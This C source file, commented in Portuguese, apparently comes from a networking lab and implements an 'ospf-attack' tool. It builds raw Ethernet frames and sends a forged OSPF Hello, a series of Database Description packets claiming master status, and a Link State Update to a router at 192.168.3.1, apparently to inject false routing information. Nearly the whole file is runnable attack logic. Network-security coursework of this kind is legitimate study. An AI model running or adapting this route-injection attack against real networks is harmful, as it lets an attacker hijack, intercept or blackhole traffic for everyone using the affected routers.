/*-------------------------------------------------------------*/
/* Exemplo Socket Raw - envio de mensagens                     */
/*-------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <arpa/inet.h>

#include "utils.h"
#include "ospf.h"
#include "ospf_attack.h"

unsigned char *parse_ip_addr(char *ip_str);

extern int errno;

int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: ospf-attack INTERFACE_NUMBER LOCAL_MAC_ADDR LOCAL_IP_ADDR\n\n");
    exit(1);
  }

  int sock_fd = 0, ret_value = 0;
  unsigned char buffer[BUFFER_LEN];
  struct sockaddr_ll destAddr;

  // Set up mac / IPv4 addresses for the machines that will receive the packets
  char *iface_index_str = argv[1]; // TODO: Usar para ler pacotes
  char *local_mac_str   = argv[2];
  char *local_ip        = argv[3];
  char *router_ip       = "192.168.3.1";

  // Convert input to bytes
  unsigned char *local_mac = parse_mac_addr(local_mac_str);
  unsigned char *dest_mac  = parse_mac_addr(IPV4_MULTICAST_MAC);
  int iface_index = atoi(iface_index_str);

  if((sock_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
    printf("Erro na criacao do socket.\n");
    exit(1);
  }

  destAddr.sll_family = htons(PF_PACKET);
  destAddr.sll_protocol = htons(ETH_P_ALL);
  destAddr.sll_halen = 6;
  destAddr.sll_ifindex = iface_index;
  memcpy(&(destAddr.sll_addr), dest_mac, MAC_ADDR_LEN);

  int packet_len = attack_write_hello(buffer, local_mac, local_ip, router_ip);
  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
    printf("ERROR! sendto() \n");
    exit(1);
  }
  printf("Send HELLO success (%d).\n", ret_value);
  sleep(3);

  /* primeiro 0x07 = master coisas para enviar e comançando, segundo 0x03 = master e tem coisas para enviar, terceiro 0x01 eu sou o master */

  unsigned long dd_seq_number = 10000;

  // 0x07
  packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_INIT + DDC_MORE + DDC_MSTR);
  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
    printf("ERROR! sendto() \n");
    exit(1);
  }
  printf("Send DB Description success (%d).\n", ret_value);
  dd_seq_number += 1;
  sleep(4);

  int i = 0;
  while (i < 4) {
    i++;
    // 0x03
    packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_MSTR + DDC_MORE);
    if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
      printf("ERROR! sendto() \n");
      exit(1);
    }
    printf("Send DB Description success (%d).\n", ret_value);
    sleep(3);
    dd_seq_number += 1;
  }
  // 0x01
  packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_MSTR);
  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
    printf("ERROR! sendto() \n");
    exit(1);
  }
  printf("Send DB Description success (%d).\n", ret_value);
  dd_seq_number += 1;

  sleep(2);

  packet_len = attack_write_ls_update(buffer, local_mac, local_ip, router_ip);
  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
    printf("ERROR! sendto() \n");
    exit(1);
  }
  printf("Send LS Update success (%d).\n", ret_value);
  return 0;
}